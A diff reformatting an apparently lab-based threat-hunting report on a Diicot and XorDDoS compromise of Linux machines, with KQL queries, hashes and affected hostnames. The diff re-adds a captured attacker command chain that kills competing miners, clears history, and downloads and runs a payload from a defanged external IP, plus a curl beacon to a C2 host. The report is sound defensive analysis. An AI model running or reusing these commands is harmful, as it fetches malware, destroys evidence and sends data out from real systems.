@@ -258,12 +258,16 @@ SHA256: `8c2a00409bad8033fec13fc6ffe4aa4732d80400072043b71ceb57db37244129`
 
 Using VirusTotal again to confirm if the suspected file was malicious or not, resulted in another positive result. Another note to add for the first three created cache files, all three were created with an initiating process command line of,
 
-`scp -qt /tmp/cache`
+```bash
+scp -qt /tmp/cache
+```
 
-Script
+Script Actions
 
 `scp` (Secure Copy Protocol) – Used to securely transfer files between systems over SSH
+
 `-q` (Quiet Mode) – Suppresses non-error messages to avoid detection
+
 `-t` (Target Mode) – Indicates that this scp command is running in receive mode, meaning it is expecting a file to be sent to `/tmp/cache`
 
 Another indicator suggesting that the cache files were malicious is that the initiating command executed in silent mode and was actively listening for commands. Understanding the purpose of these files as reverse shells, network connections established by these files were searched for. With the following query,
@@ -302,122 +306,131 @@ The query returned four logs identifying devices that contained the malicious `U
 After identifying the affected systems containing the malicious `.bisis` payload, the file's SHA256 hash was cross-referenced with VirusTotal, confirming that the discovered file was indeed malicious. The hashes:
 
 MD5: `5e12f81d5f949dbbd24ab82990a4bc5b`
+
 SHA1: `7f65f650fb8bbc48e803af72b236ebd2f03095a6`
+
 SHA256: `2828ca39e2a5b0fd3b0968bc75b67b4c587a49c13929a6cb050b0989ee01cd22`
 
 VirusTotal identifies the discovered `.bisis` file as belonging to the "portscan" family, aligning with Diicot’s use of the `.bisis` payload as a port scanner.
 
 ## Other Indicators of Compromise
 
-Inspecting network activity on device
-“sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net”
-numerous abnormal activities were logged. Inspecting the DeviceNetworkEvents table
-revealed suspicious network activity originating from a file called cache.
+Inspecting network activity on device `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` numerous abnormal activities were logged. Inspecting the `DeviceNetworkEvents` table revealed suspicious network activity originating from a file called `cache`.
+
 Query
+
+```kql
 DeviceNetworkEvents
 | where Timestamp >= datetime(2024-11-01)
 | where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
 | where * contains "cache"
-Within the device “sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net”,
-malicious activity was conducted. The threat actor begins their activity when the network file is
-executed at “2025-03-14T17:52:01.898895Z”. The executed file runs a script that sends
-connection requests to multiple IP addresses within the network.
+```
+
+Within the device `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`, malicious activity was conducted. The threat actor begins their activity when the network file is executed at `2025-03-14T17:52:01.898895Z`. The executed file runs a script that sends connection requests to multiple IP addresses within the network.
+
 Script
-./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ;
-chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae
-/var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ;
-killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv
-/var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ;
-/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history
-~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q
-85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu ;
-mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf
-.bash_history ~/.bash_history"
+
+```bash
+./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
+```
+
 The script performs multiple malicious actions that include the following activity:
-1. Deletes shell history to cover up execution and removes “.bash_history” to erase
-evidence of past commands
+
+1. Deletes shell history to cover up execution and removes `.bash_history` to erase evidence of past commands
+
 2. Removes immutable attributes on the SSH keys
+
 3. Removes scheduled cron jobs, possibly to disable security or existing admin jobs
+
 4. Kills multiple processes
-5. Downloads a suspicious binary (.balu) from an external IP (85[.]31[.]47[.]99) and
-renames it to cache
-6. Moves files into hidden directories (.diicot, kuak).
-chmod +x .* makes all hidden files executable, possibly including additional malware
-The network file’s observed activity also appears to mimic documented behavior of Diicot’s
-.bisis file. Where the file sends connection requests to other systems on port 22, possibly
-looking for specific responses that indicate the presence of OpenSSH. The public IP address
-found in the script is classified as malicious by VirusTotal.
-The file location of the network file is “/dev/shm/.x/network” and with the payload being
-initiated by the “root” user in the “sakel-lunix-2” domain. The discovered “network” payload
-has a SHA256 hash value of,
-SHA256: cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255
-This file has not yet been flagged as malicious by public online services, such as VirusTotal, at
-the time of this report. Expanding my search within the CyberRange network for the script,
-uncovered other systems containing it
+
+5. Downloads a suspicious binary `(.balu)` from an external IP `(85[.]31[.]47[.]99)` and renames it to 'cache'
+
+6. Moves files into hidden directories (`.diicot`, `kuak`) `chmod +x .*` makes all hidden files executable, possibly including additional malware
+
+The `network` file’s observed activity also appears to mimic documented behavior of Diicot’s `.bisis` payload. Where the file sends connection requests to other systems on port 22, possibly looking for specific responses that indicate the presence of OpenSSH. The public IP address found in the script is classified as malicious by VirusTotal. 
+
+The file location of the network file is `/dev/shm/.x/network` and with the payload being initiated by the `root` user in the `sakel-lunix-2` domain. The discovered `network` payload has a SHA256 hash value of,
+
+SHA256: `cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255`
+
+This file has not yet been flagged as malicious by public online services, such as VirusTotal, at the time of this report. Expanding my search within the CyberRange network for the script, uncovered other systems containing it
+
 Query
+
+```kql
 DeviceFileEvents
 | where Timestamp >= datetime(2024-11-01)
-| where SHA256 ==
-"cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255"
+| where SHA256 == "cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255"
 | order by Timestamp asc
-| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
-InitiatingProcessAccountDomain, InitiatingProcessAccountName
+| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessAccountDomain, InitiatingProcessAccountName
+```
+
 The query revealed that the script was also present in three other systems, the device being,
-1. linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-2. linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-3. linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-Other suspicious activity also occurs at “2025-03-14T17:52:01.898895Z” when the threat actor
-executes the cache file initiating a connection request to a known Diicot C2 server. And another
-instance of suspicious behavior occurs at “2025-03-14T18:23:35.941725Z” when the threat
-actor executes the command,
-curl --silent http://196[.]251[.]73[.]38:47/save-data?IP=45[.]64[.]186[.]20 -H "Accept:
-text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng
-,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Accept-Language:
-en-US,en;q=0.9" -H "Cache-Control: max-age=0" -H "Connection: keep-alive" -H
-"Upgrade-Insecure-Requests: 1" --insecure
-The command sends the IP address 45[.]64[.]186[.]20 to the remote IP address of
-196[.]251[.]73[.]38 on port 47. Suggesting that there is possible data exfiltration, tracking, or
-botnet communication occurring. Referencing the remote IP address to VirusTotal returned a
-positive malicious affiliated IP address.
-One other indicator of compromise discovered in association with the newly created cron job
-gcc.sh (Persistence Mechanism section) Trojan, is the initiating file called ygljglkjgfg0. This file
-is responsible for initiating the creation of the malicious scheduled job on several systems.
-Using a query, the entirety of the network was searched for systems hosting files with the same
-name.
+
+1. `linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+2. `linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+3. `linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+Other suspicious activity also occurs at `2025-03-14T17:52:01.898895Z` when the threat actor executes the cache file initiating a connection request to a known Diicot C2 server. And another instance of suspicious behavior occurs at `2025-03-14T18:23:35.941725Z` when the threat actor executes the command,
+
+```bash
+curl --silent http://196[.]251[.]73[.]38:47/save-data?IP=45[.]64[.]186[.]20 -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Accept-Language: en-US,en;q=0.9" -H "Cache-Control: max-age=0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" --insecure
+```
+
+The command sends the IP address `45[.]64[.]186[.]20` to the remote IP address of `196[.]251[.]73[.]38` on port 47. Suggesting that there is possible data exfiltration, tracking, or botnet communication occurring. Referencing the remote IP address to VirusTotal returned a positive malicious affiliated IP address.
+
+One other indicator of compromise discovered in association with the newly created cron job `gcc.sh` (Persistence Mechanism section) trojan, is the initiating file called `ygljglkjgfg0`. This file is responsible for initiating the creation of the malicious scheduled job on several systems. Using a query, the entirety of the network was searched for systems hosting files with the same name.
+
 Query
+
+```kql
 DeviceFileEvents
 | where Timestamp >= datetime(2024-11-01)
 | where FileName == "ygljglkjgfg0"
 | order by Timestamp asc
 | project Timestamp, DeviceName, ActionType, SHA256
-Interestingly, the returned logs revealed seven distinct SHA256 hashes present on all known
-compromised systems hosting. The hashes were then cross referenced using VirusTotal and the
-results were mixed. Some of the hashes were classified as malicious, while others were not.
-Possibly indicating that publicly, undetected malware was present in some systems. The
-affected devices were as followed,
-1. ff-vm-lx-224-base.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-2. linux-vm-vulnerablity-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-3. linux-vulnmgmt-kobe.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-4. lab-linux-vuln.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-5. linux-moh-jan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-6. linux-vm-vun-test-zay.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-7. linuxvmvulnerability-test-corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
+```
+
+Interestingly, the returned logs revealed seven distinct SHA256 hashes present on all known compromised systems hosting. The hashes were then cross referenced using VirusTotal and the results were mixed. Some of the hashes were classified as malicious, while others were not. Possibly indicating that publicly, undetected malware was present in some systems. The affected devices were as followed,
+
+1. `ff-vm-lx-224-base.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+2. `linux-vm-vulnerablity-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+3. `linux-vulnmgmt-kobe.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+4. `lab-linux-vuln.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+5. `linux-moh-jan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+6. `linux-vm-vun-test-zay.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+7. `linuxvmvulnerability-test-corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
 And the seven distinct hashes and their VirusTotal results are,
-1. 3c1f9f07eacc2f057a609c955e2fde38493521268f3493717ffa5a31b261f3ef (Malicious)
-2. 99f9ec2cd5cee445830b5500fecbb37861a06c50b174d0d8635c14ffeb236c9d (Not Flagged)
-3. 6ddf688bdf16a1d465aef954ff90b372dacd8162bac2c7797ff7b6b4f20afcbc (Malicious)
-4. 268132cf61dfb55c5ebb7ef34a58c915442949b92f645c6f28887ceca5c6c19d (Not Flagged)
-5. 2f70458e2b77fba49697e3fbba8bea53e27e7ca010fd92ca3919b819d3aee160 (Malicious)
-6. 0e817a2325c215997de15851152a66924874739eeff5da4b434e5d36c83a76eb (Malicious)
-7. 75bfd448e4274cc4e5804c43768f62a36ccb3fc3b1df06e14d9c892daa2cde19 (Malicious)
-Reviewing the returned VirusTotal results indicated that the ygljglkjgfg0 payload found on the
-compromised devices are associated with Linux Trojans called XorDDoS. XorDDoS Trojans are
-a Linux-based malware that has been observed in DDoS botnet campaigns. It is known for
-using XOR-based encryption to evade detection and is often deployed to compromise Linux
-servers through SSH brute-force attacks.
-Conscious that there could be more XorDDos Trojans in the network, a query using all seven
-distinct SHA256 hashes was crafted.
+
+1. `3c1f9f07eacc2f057a609c955e2fde38493521268f3493717ffa5a31b261f3ef` *(Malicious)*
+
+2. `99f9ec2cd5cee445830b5500fecbb37861a06c50b174d0d8635c14ffeb236c9d` *(Not Flagged)*
+
+3. `6ddf688bdf16a1d465aef954ff90b372dacd8162bac2c7797ff7b6b4f20afcbc` *(Malicious)*
+
+4. `268132cf61dfb55c5ebb7ef34a58c915442949b92f645c6f28887ceca5c6c19d` *(Not Flagged)*
+
+5. `2f70458e2b77fba49697e3fbba8bea53e27e7ca010fd92ca3919b819d3aee160` *(Malicious)*
+
+6. `0e817a2325c215997de15851152a66924874739eeff5da4b434e5d36c83a76eb` *(Malicious)*
+
+7. `75bfd448e4274cc4e5804c43768f62a36ccb3fc3b1df06e14d9c892daa2cde19` *(Malicious)*
+
+Reviewing the returned VirusTotal results indicated that the `ygljglkjgfg0` payload found on the compromised devices are associated with Linux Trojans called `XorDDoS`. `XorDDoS` Trojans are a Linux-based malware that has been observed in DDoS botnet campaigns. It is known for using XOR-based encryption to evade detection and is often deployed to compromise Linux servers through SSH brute-force attacks. Conscious that there could be more `XorDDos` Trojans in the network, a query using all seven distinct SHA256 hashes was crafted.
+
 Query
+
+```kql
 DeviceFileEvents
 | where Timestamp >= datetime(2024-11-01)
 | where SHA256 in
@@ -429,18 +442,30 @@ DeviceFileEvents
 "0e817a2325c215997de15851152a66924874739eeff5da4b434e5d36c83a76eb",
 "75bfd448e4274cc4e5804c43768f62a36ccb3fc3b1df06e14d9c892daa2cde19")
 | distinct DeviceName
-The query returned nine devices that had a file containing at least one of the XorDDoS Trojan's
-SHA256 hashes.
-1. linux-vm-vulnerablity-test
-2. ff-vm-lx-224-base.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-3. linux-vm-vulnerablity-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-4. linux-vulnmgmt-kobe.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-5. linux-caleb-programmatic.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-6. lab-linux-vuln.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-7. linux-moh-jan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-8. linux-vm-vun-test-zay.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-9. linuxvmvulnerability-test-corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-Diicot Techniques
+```
+
+The query returned nine devices that had a file containing at least one of the XorDDoS Trojan's SHA256 hashes.
+
+1. `linux-vm-vulnerablity-test`
+
+2. `ff-vm-lx-224-base.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+3. `linux-vm-vulnerablity-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+4. `linux-vulnmgmt-kobe.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+5. `linux-caleb-programmatic.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+6. `lab-linux-vuln.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+7. `linux-moh-jan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+8. `linux-vm-vun-test-zay.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+9. `linuxvmvulnerability-test-corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+## Diicot Techniques
+
 File Obfuscation (T1027.002)
 As previously mentioned, Diicot uses file obfuscation to obfuscate the UPX headers of their
 payloads. For example, the malicious "Update" file's UPX header has been observed to be
